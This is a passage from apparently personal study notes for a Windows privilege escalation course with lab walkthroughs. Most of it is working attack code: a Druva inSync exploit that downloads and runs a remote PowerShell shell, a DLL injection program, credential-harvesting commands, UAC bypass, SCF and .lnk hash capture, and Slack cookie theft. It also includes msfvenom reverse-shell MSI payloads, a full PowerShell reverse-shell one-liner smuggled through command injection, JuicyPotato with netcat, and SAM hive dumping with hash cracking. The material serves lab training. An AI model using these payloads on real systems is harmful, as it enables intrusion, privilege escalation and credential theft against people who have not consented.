
    $cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"

    $s = New-Object System.Net.Sockets.Socket(
        [System.Net.Sockets.AddressFamily]::InterNetwork,
        [System.Net.Sockets.SocketType]::Stream,
        [System.Net.Sockets.ProtocolType]::Tcp
    )
    $s.Connect("127.0.0.1", 6064)

    $header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
    $rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
    $command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
    $length = [System.BitConverter]::GetBytes($command.Length);

    $s.Send($header)
    $s.Send($rpcType)
    $s.Send($length)
    $s.Send($command)
    ```

* DLL injection:

    * LoadLibrary -

        ```c
        #include <windows.h>
        #include <stdio.h>

        int main() {
            // Using LoadLibrary for DLL injection
            // First, we need to get a handle to the target process
            DWORD targetProcessId = 123456 // The ID of the target process
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
            if (hProcess == NULL) {
                printf("Failed to open target process\n");
                return -1;
            }

            // Next, we need to allocate memory in the target process for the DLL path
            LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
            if (dllPathAddressInRemoteMemory == NULL) {
                printf("Failed to allocate memory in target process\n");
                return -1;
            }

            // Write the DLL path to the allocated memory in the target process
            BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
            if (!succeededWriting) {
                printf("Failed to write DLL path to target process\n");
                return -1;
            }

            // Get the address of LoadLibrary in kernel32.dll
            LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            if (loadLibraryAddress == NULL) {
                printf("Failed to get address of LoadLibraryA\n");
                return -1;
            }

            // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path
            HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
            if (hThread == NULL) {
                printf("Failed to create remote thread in target process\n");
                return -1;
            }

            printf("Successfully injected example.dll into target process\n");

            return 0;
        }
        ```
    
    * Manual mapping - complex, advanced form of DLL injection; involves manual loading of DLL into process's memory and resolves its imports & relocations, and it is not easy to detect

    * [Reflective DLL injection](https://github.com/stephenfewer/ReflectiveDLLInjection)

    * DLL hijacking -

        * if an app doesn't specify the full path to a required DLL, DLL hijacking can be used to load DLLs during runtime

        * default DLL search order used by system depends on whether 'Safe DLL Search Mode' is activated or not; when disabled, user directory is higher up in the priority, making it easier for DLL hijacking

        * first, we need to pinpoint a DLL the target is attempting to locate; tools such as ```Process Explorer``` (view info on running processes and its loaded DLLs) and ```PE Explorer``` (examine PE files like .exe or .dll files, and check DLLs used)

        * then, we need to understand which functions to modify - RE tools like disassemblers and debuggers are needed

        * once the functions and their signatures have been identified, we can construct the DLL

        * techniques like DLL proxying and crafted libraries (replacing invalid libraries) can be used to execute a hijack

## Credential Theft

```ps
# application config files
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

# Chrome dictionary files
# stores words which are part of custom dictionary
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

# unattended installation files can also store passwords
# search for 'unattend.xml' files

# check PowerShell history save path
(Get-PSReadLineOption).HistorySavePath

# read PowerShell history
gc (Get-PSReadLineOption).HistorySavePath

# assuming default save path is being used for all users
# we can search all PowerShell history files that can be accessed as current user
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

# if PowerShell credentials are used, we can recover cleartext creds
# in case it is being referred from another file
$credential = Import-Clixml -Path 'C:\scripts\pass.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password
```

```cmd
# manually searching filesystem for creds
# cheatsheet - https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/

cd c:\Users\htb-student\Documents & findstr /SI /M "password" *.xml *.ini *.txt

findstr /si password *.xml *.ini *.txt *.config

findstr /spin "password" *.*

# search for file extensions
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*

where /R C:\ *.config
```

```ps
# searching filesystem for creds in PowerShell
select-string -Path C:\Users\htb-student\Documents\*.txt -Pattern password

# search for file extensions
Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore

# check Sticky Notes for any creds
# it is stored in a .sqlite file in the below path - check for all users
cd C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState
# we can copy the 'plum.sqlite*' files to attacker and view with tools like 'DB Browser for SQLite'
# using the query 'select Text from Note;'
```

```cmd
# other files of interest, which can include creds -
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
```

```cmd
# list saved creds in cmdkey
cmdkey /list

# if creds are saved in runas, we can use that and run commands as another user
runas /savecred /user:inlanefreight\bob "whoami"
```

```ps
# retrieving saved creds from Chrome
# using tools like SharpChrome - https://github.com/GhostPack/SharpDPAPI
.\SharpChrome.exe logins /unprotect

# if password managers are being used, we can try to get access to it
# for KeePass, .kdbx files are used, which can be cracked using keepass2john and hashcat

# if we have email systems like Microsoft Exchange
# we can search user emails for creds using the MailSniper tool - https://github.com/dafthack/MailSniper
```

```ps
# we can use tools like LaZagne - https://github.com/AlessandroZ/LaZagne
# to check creds from installed software
.\lazagne.exe -h

# run all modules
.\lazagne.exe all

# we can use tools like SessionGopher - https://github.com/Arvanaghi/SessionGopher
# to extract saved creds from remote access tools like PuTTY

# we need local admin access to fetch stored session info, but we can try with any user
Import-Module .\SessionGopher.ps1

Invoke-SessionGopher -Target WINLPE-SRV01
```

```cmd
# enumerate Autologon saved creds
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# enumerate saved PuTTY sessions
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
# if any session is saved, this will give the key
# we can check if it has any creds saved
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh
```

```cmd
# view saved wireless networks
netsh wlan show profile

# get saved wireless passwords - this depends on network config
netsh wlan show profile ilfreight_corp key=clear
```

## Restricted Environments

* [Citrix breakout](https://www.pentestpartners.com/security-blog/breaking-out-of-citrix-and-other-restricted-desktop-environments/):

    * bypassing path restrictions:

        * using File Explorer, we cannot visit 'C:\Users' as it throws an error
        * we can [use Windows dialog boxes to bypass the GPO restrictions](https://node-security.com/posts/breaking-out-of-windows-environments/)
        * we can access apps like Paint, then click on File > Open - this opens a dialog box to choose the file path
        * here we can enter the UNC path ```\\127.0.0.1\c$\users\pmorgan``` in the filename field, with filetype set to 'All Files' - this gives us access to the Users directory
    
    * accessing SMB share from restricted environment:

        * on attacker, start a SMB server - ```smbserver.py -smb2support share $(pwd)```
        * on Citrix environment, start Paint app, click on File > Open - this prompts the dialog box
        * input UNC path ```\\10.10.14.15\share``` in the filename field with filetype set to 'All Files' - this lets us access the attacker SMB share
        * we can right-click on the file and open it
        * we can serve compiled '.exe' files which can launch the command prompt (so that launching the '.exe' file gives us a shell):

            ```c
            #include <stdlib.h>
            int main() {
            system("C:\\Windows\\System32\\cmd.exe");
            }
            ```

            ```sh
            # on attacker
            vim cmd.c

            # compile
            x86_64-w64-mingw32-gcc cmd.c -o cmd.exe
            ```
        
        * we can then use the cmd to copy files from SMB share:

            ```sh
            powershell -ep bypass
            # launch PS in cmd

            xcopy \\10.10.14.15\share\Bypass-UAC.ps1 .

            dir
            # files are copied now
            ```
    
    * alternate explorer:

        * if strict restrictions are imposed on File Explorer, we can use alternate filesystem editors like 'Q-Dir' or 'Explorer++' for bypassing
    
    * alternate registry editors:

        * when default Registry Editor is blocked by GPO, we can use alternate tools to bypass, like 'simpleregedit, 'uberregedit' and 'SmallRegistryEditor'
    
    * modify existing shortcuts:

        * right-click the shortcut file and select 'Properties'
        * within the 'Target' field, we can give the intended file to access; we can launch command prompt using ```C:\Windows\System32\cmd.exe``` as the target path
        * we can also transfer an existing shortcut file using SMB server or generate a malicious '.lnk' file
    
    * script execution:

        * if script extensions like '.bat', '.vbs', or '.ps' are configured to be automatically executed, we can exploit this using malicious scripts
        * create a text file named 'evil.bat', open it with Notepad and input the command ```cmd``` in the file
        * if we save the file and execute it, it launches cmd
    
    * escalating privileges:

        * once we have cmd, we can use tools like ```winpeas``` and ```PowerUp```
        * check if 'Always Install Elevated' key is present:

            ```cmd
            reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

            reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
            ```
        
        * if enabled, we can use ```Write-UserAddMSI``` from ```PowerUp``` to exploit this:

            ```ps
            Import-Module .\PowerUp.ps1

            Write-UserAddMSI
            # this creates a .msi executable
            ```
        
        * we can execute the '.msi' file and create a new user under Administrators - then we can use ```runas``` to execute commands:

            ```cmd
            runas /user:newadmin cmd
            # launch cmd as new admin user
            ```
    
    * bypassing UAC:

        * even with admin user, we cannot access Administrator directory due to UAC
        * we can use [Bypass-UAC](https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC) scripts:

            ```ps
            Import-Module .\Bypass-UAC.ps1

            Bypass-UAC -Method UacMethodSysprep
            ```
        
        * this launches a new PS window with higher privileges

## Additional Techniques

* Interacting with users:

    * traffic capture:

        * if Wireshark or ```tcpdump``` is installed, unprivileged users can capture network traffic
        * we can also use tools like [net-creds](https://github.com/DanMcInerney/net-creds) on attacker machine to sniff passwords & hashes from a live interface or a pcap
    
    * process command lines:

        * check for scheduled tasks or processes being executed which pass creds on CLI
        * we can use ```procmon``` to monitor the target:

            ```ps
            # process monitor script
            while($true)
            {

            $process = Get-WmiObject Win32_Process | Select-Object CommandLine
            Start-Sleep 1
            $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
            Compare-Object -ReferenceObject $process -DifferenceObject $process2

            }
            ```

            ```ps
            # fetch and execute procmon script
            IEX (iwr 'http://10.10.13.14/procmon.ps1')
            ```
    
    * vulnerable services:

        * check for vulnerable services or apps that can be used for privesc; an example is [CVE-2019-15752](https://medium.com/@morgan.henry.roman/elevation-of-privilege-in-docker-for-windows-2fd8450b478e) for Docker Desktop app
    
    * SCF on a fileshare:

        * SCF (shell command file) is used by Windows Explorer to navigate directories and files
        * it can be manipulated to have the icon file location point to a specific UNC path and launch it, when the folder with the '.scf' file is accessed
        * create a file with a common, benign name like '@inventory.scf' ('@' so that it is at top of directory and executed as soon as the user accesses the share/folder) - the icon path will be pointing to the attacker:

            ```text
            [Shell]
            Command=2
            IconFile=\\10.10.13.14\share\legit.ico
            [Taskbar]
            Command=ToggleDesktop
            ```
        
        * move the SCF file to a Public folder on target, or any commonly accessed share - check all available shares from root of directory
        * on attacker, start ```responder``` and wait for victim to browse the share:

            ```sh
            sudo responder -I tun0
            # we will get hash once user browses the share

            # crack the NTLMv2 hash
            hashcat -m 5600 hash rockyou.txt
            ```
    
    * malicious '.lnk' file:

        * as SCFs do not work on newer hosts, we can generate a malicious '.lnk' file with [lnkbomb](https://github.com/dievus/lnkbomb)
        * we can also use PS scripting to generate a '.lnk' file:

            ```ps
            $objShell = New-Object -ComObject WScript.Shell
            $lnk = $objShell.CreateShortcut("C:\legit.lnk")
            $lnk.TargetPath = "\\<attackerIP>\@pwn.png"
            $lnk.WindowStyle = 1
            $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
            $lnk.Description = "Browsing to the directory where this file is saved will trigger an auth request."
            $lnk.HotKey = "Ctrl+Alt+O"
            $lnk.Save()
            ```

* Pillaging:

    * installed apps:

        ```cmd
        dir "C:\Program Files"
        # check contents of 'Program Files' and 'Program Files (x86)' to find installed apps
        ```

        ```ps
        # get installed apps via powershell and registry keys
        $INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |  Select-Object DisplayName, DisplayVersion, InstallLocation

        $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, InstallLocation

        $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

        # suppose list of installed apps includes mRemoteNG
        # it is a tool used to connect to remote systems

        # it uses a default hardcoded master password 'mR3m', so we can check if config file is unprotected and contains creds
        # by default, config file is located in %USERPROFILE%\APPDATA\Roaming\mRemoteNG

        ls C:\Users\julio\AppData\Roaming\mRemoteNG
        # list config files

        cat confCons.xml
        # view config file

        # this document contains the master password under 'Protected' attribute and the encrypted password under 'password'
        # to crack this, we can use the mRemoteNG-Decrypt script - https://github.com/haseebT/mRemoteNG-Decrypt
        ```

        ```sh
        # on attacker
        python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig=="
        # decrypt the password
        # this works if user did not set a custom master password
        # if we know the master password we can use -p flag

        # we can also try cracking the password with multiple master passwords from wordlist
        for password in $(cat /usr/share/wordlists/fasttrack.txt);do echo $password; python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p $password 2>/dev/null;done
        ```
    
    * abusing cookies to get access to IM clients:

        ```ps
        # instant messaging clients like Slack can store cookies in browser

        # firefox saves cookies in a SQLite DB at '%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release'
        # copy this SQLite DB
        copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
        # copy this file to attacker
        ```

        ```sh
        # on attacker
        # we can use cookiextractor.py script - https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py
        python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
        # we have the cookie value for 'd', which Slack uses to store auth token

        # we can use this cookie value using a browser extension like Cookie-Editor
        # with name 'd' and value from above, we can try to log into Slack
        # refresh the browser page if we get a login prompt
        ```

        ```ps
        # for cookie extraction from Chromium-based browsers
        # we can use Invoke-SharpChromium - https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1

        IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')

        Invoke-SharpChromium -Command "cookies slack.com"
        # it may look for cookie file in '%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies'
        # or '%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies'
        ```
    
    * clipboard:

        ```ps
        # check for any info in clipboard
        # using Invoke-Clipboard script - https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1
        IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1')

        Invoke-ClipboardLogger
        # starts to monitor for entries in clipboard
        ```
    
    * attacking backup servers:

        ```ps
        # using restic as an example for backup tool
        # create and initialize the repository - location where backup will be saved
        mkdir E:\restic2; restic.exe -r E:\restic2 init

        # take backup of directory
        $env:RESTIC_PASSWORD = 'Password'

        restic.exe -r E:\restic2\ backup C:\SampleFolder

        # to backup directories like C:\Windows, we have to create a VSS using --use-fs-snapshot
        restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot

        # check backups saved in repository, this also shows backup ID
        restic.exe -r E:\restic2\ snapshots

        # restore backups using their ID
        restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
        ```

* Miscellaneous Techniques:

    * [LOLBAS (Living Off the Land Binaries and Scripts)](https://lolbas-project.github.io):

        ```ps
        # LOLBAS project lists Windows binaries and scripts of use for attackers

        # transferring files with certutil
        certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
        ```

        ```cmd
        # encoding file with certutil
        certutil -encode file1 encodedfile

        # decoding file
        certutil -decode encodedfile file2

        # binaries like rundll32.exe can be used to execute a DLL file
        ```
    
    * Always Install Elevated:

        ```ps
        # enumerate AlwaysInstallElevated settings
        reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
        reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
        ```

        ```sh
        # exploit this by generating a malicious MSI package and execute it
        # on attacker
        msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi

        # setup a python server to transfer the machine
        # and setup a netcat listener to catch the revshell
        ```

        ```cmd
        # transfer the MSI file to victim
        # and execute the file to get reverse shell
        msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
        ```
    
    * CVE-2019-1388:

        * privesc vuln in Windows Certificate Dialog - can be exploited using an old Microsoft-signed executable like 'hhupd.exe' that contains a cert with 'SpcSpAgencyInfo' field with hyperlink
        * first, right-click on 'hhupd.exe' and Run as Administrator
        * then, click on "Show information about the publisher's certificate" to open the cert dialog
        * in the 'General' tab, click on the hyperlink for 'Issued by' and click OK - this closes the cert dialog and launches the browser window
        * from Task Manager, we can view that the browser instance was launched as SYSTEM
        * in webpage, right-click and 'View page source' - once the page source opens in another tab, right-click again and select 'Save as' to open another dialog
        * in the File Explorer dialog, type ```C:\Windows\System32\cmd.exe``` in the filepath and hit enter - this launches cmd as SYSTEM
    
    * Scheduled Tasks:

        ```cmd
        # enumerate scheduled tasks
        schtasks /query /fo LIST /v
        ```

        ```ps
        # check scheduled tasks in PS
        Get-ScheduledTask | select TaskName,State
        ```

        ```cmd
        # check for any directories which includes files that run on a scheduled basis
        # for example, if we have a Scripts directory, check for permissions
        .\accesschk64.exe /accepteula -s -d C:\Scripts\
        ```
    
    * User/Computer Description Field:

        ```ps
        # checking local user desc field
        Get-LocalUser

        # check computer desc
        Get-WmiObject -Class Win32_OperatingSystem | select Description
        ```
    
    * Mount VHDX/VMDK:

        ```sh
        # suppose we found VHDX - Virtual Hard Disk files
        # or VMDK - Virtual Machine Disk files
        # we can mount them on our attacker box and check for any info

        # mount VMDK
        guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk

        # mount VHD/VHDX
        guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1

        # we can mount these files in Windows using right-click > Mount, or using Disk Management utility

        # there are multiple ways to get access to files on a .vmdk - https://www.nakivo.com/blog/extract-content-vmdk-files-step-step-guide/
        ```

        ```sh
        # if we can access 'C:\Windows\System32\Config' directory
        # and get SAM, SECURITY & SYSTEM hives, we can crack the hashes
        # on attacker
        secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
        ```

## End of Life Systems

* Windows Server:

    ```cmd
    # query current patch level
    wmic qfe
    ```

    ```ps
    # run Sherlock to fetch more info
    Set-ExecutionPolicy Bypass -Scope process

    Import-Module .\Sherlock.ps1
    
    Find-AllVulns
    # reports multiple CVEs if it is older
    ```

    ```sh
    # on attacker
    # we can use the smb_delivery module from Metasploit to get reverse shell

    sudo msfconsole
    # we need bind permissions for port 445

    search smb_delivery

    use 0

    show options
    # config everything to host share

    show targets
    # DLL and PSH

    set target 0
    # DLL

    exploit
    # this gives a command to be run on victim
    ```

    ```cmd
    # on victim server
    # run the reqd command
    rundll32.exe \\10.10.14.3\lEUZam\test.dll,0
    # this gives us a Meterpreter reverse shell
    ```

    ```sh
    # in reverse shell
    # we can search for local privesc exploits
    # search for one of the exploits shown by Sherlock earlier

    search 2010-3338
    # MS10_092 Windows Task Scheduler .XML privesc

    use 0

    # need to migrate to a 64-bit process before using this exploit
    # alternatively, use a x64 payload for getting reverse shell

    # in meterpreter, get back to session
    sessions -i 1

    getpid
    # shows current PID

    ps

    migrate 2796
    # migrate to one of the x64 processes like conhost.exe

    background

    # now we can set the privesc module options
    show options

    exploit
    # this gives us a shell as NT AUTHORITY\SYSTEM
    ```

* Windows 7 Desktop versions:

    ```cmd
    # capture the systeminfo output
    # and save it to a file on attacker
    systeminfo
    ```

    ```sh
    # on attacker
    # we can use Windows-Exploit-Suggester tool - https://github.com/AonCyberLabs/Windows-Exploit-Suggester

    # update local copy of Microsoft vuln database
    sudo python2.7 windows-exploit-suggester.py --update

    # run it against the systeminfo collected
    python2.7 windows-exploit-suggester.py  --database 2021-05-13-mssb.xls --systeminfo win7lpe-systeminfo.txt

    # if we are on a Meterpreter shell
    # we can also use the local exploit suggester module
    ```

    ```ps
    # for example, one of the suggested exploits was MS16-032
    # we can search for the exploits and use it

    Set-ExecutionPolicy bypass -scope process

    Import-Module .\Invoke-MS16-032.ps1

    Invoke-MS16-032
    # we get shell as system
    ```

## Skills Assessment

* Part 1:

    ```sh
    ping 10.129.225.46
    # target not responding to ping
    # we can check for open ports

    nmap -T4 -p- -A -Pn -v 10.129.225.46
    # port 80 is open

    # it is given that the webpage has a command injection vulnerability
    # it is a ping test page

    # command injection works with '&&' character
    # payloads like '127.0.0.1 && whoami' work
    # we can use this to get RCE

    # setup listener
    nc -nvlp 4444
    ```

    ```ps
    # payload to get reverse shell
    # taken from revshells
    '127.0.0.1 && powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.252',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
    ```

    ```ps
    # in our reverse shell
    whoami
    # iis apppool\defaultapppool

    Get-HotFix | ft -AutoSize
    # get hotfix IDs

    # we need to find cleartext creds for 'ldapadmin' user

    cd C:\

    findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
    # search for password in common files

    Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
    # search for common file extensions for cred hunting

    # testing with tools like LaZagne.exe also does not give anything
    # we can try searching this again after privesc
    ```

    ```ps
    # enumerating for privesc
    net user

    whoami /priv
    # this shows SeImpersonatePrivilege is enabled
    # we can use the JuicyPotato exploit

    # on attacker, setup server to transfer nc.exe and JuicyPotato.exe
    python3 -m http.server

    # setup listener as well
    nc -nvlp 4445

    # on target reverse shell
    certutil.exe -urlcache -f http://10.10.14.252:8000/nc.exe nc.exe

    certutil.exe -urlcache -f http://10.10.14.252:8000/JuicyPotato.exe JuicyPotato.exe

    # run the exploit
    C:\Windows\Temp\JuicyPotato.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\nc.exe 10.10.14.252 4445 -e cmd.exe" -t *
    # -l is COM server listening port, on which it listens for incoming connections
    # -p is program to launch
    # -t is createprocess call

    # this command does not work and throws an error
    # 'COM -> recv failed with error: 10038'
    # we need to get the correct CLSID first

    systeminfo
    # note down OS Name and system type
    # in this case - Microsoft Windows Server 2016 Standard, x64-based

    # we can get the CLSID for JuicyPotato
    # from - https://github.com/ohpe/juicy-potato/tree/master/CLSID

    # we can try checking with common CLSIDs from the list for the system

    C:\Windows\Temp\JuicyPotato.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\nc.exe 10.10.14.252 4445 -e cmd.exe" -t * -c '{b8f87e75-d1d5-446b-931c-3f61b97bca7a}'

    C:\Windows\Temp\JuicyPotato.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\nc.exe 10.10.14.252 4445 -e cmd.exe" -t * -c '{B91D5831-B1BD-4608-8198-D72E155020F7}'
    # this works and we get reverse shell on our second listener
    ```

    ```cmd
    # on the reverse shell in second listener
    whoami
    # shell as system

    type C:\Users\Administrator\Desktop\flag.txt

    # search for confidential.txt file
    cd C:\

    dir /b/s confidential.txt
    # we get a hit

    type C:\Users\Administrator\Music\confidential.txt

    # now as privileged user, we can try searching for the password for 'ldapadmin' again

    # get lazagne.exe from attacker machine
    certutil.exe -urlcache -f http://10.10.14.252:8000/LaZagne.exe laz.exe

    laz.exe all
    # this gives us the cleartext password
    ```

* Part 2:

    ```ps
    # connect to target machine via RDP using given creds
    xfreerdp /u:htb-student /p:'HTB_@cademy_stdnt!' /v:10.129.43.33 /drive:share,/tmp
    # mounted /tmp to 'share' drive for easy access

    # search for creds

    cd C:/

    findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
    # this gives us multiple hits
    # check the interesting files for any cleartext creds

    type C:\Windows\Panther\unattend.xml
    # this includes the creds 'iamtheadministrator:Inl@n3fr3ight_sup3rAdm1n!'
    # for domain INLANEFREIGHT

    net users
    # this user is not mentioned anywhere

    # we can try to check for other methods to search for privesc vectors
    ```

    ```ps
    # on attacker, copy winpeas.ps1 to /tmp

    # on target Windows, copy the winpeas.ps1 file from 'share' to Desktop

    cd Desktop

    .\winPEAS.ps1
    # Windows 10 Pro, build 18363
    # most recent hotfix is KB4528760

    # winpeas shows AlwaysInstallElevated is set to 1
    # we can try exploiting it with msfvenom msi package
    ```

    ```sh
    # on attacker
    # setup listener
    nc -nvlp 9443

    # generate malicious MSI file
    msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
    # transfer this to target machine

    # on Windows machine
    msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
    # this gives us reverse shell on our listener
    ```

    ```sh
    # on reverse shell
    whoami
    # system

    # we can fetch NTLM hashes by extracting it from hives

    cd C:\Users\Administrator\Desktop
    # get flag

    reg save HKLM\SYSTEM SYSTEM.SAV

    reg save HKLM\SAM SAM.SAV

    reg save HKLM\SECURITY SECURITY.SAV
    # transfer these hive files to attacker machine
    ```

    ```sh
    # on attacker machine
    secretsdump.py -sam SAM.SAV -security SECURITY.SAV -system SYSTEM.SAV LOCAL
    # this dumps the NTLM hashes
    
    # copy the NTLM hashes only to a file
    vim hashes.txt

    # cracking NTLM hashes
    hashcat -a 0 -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
    ```
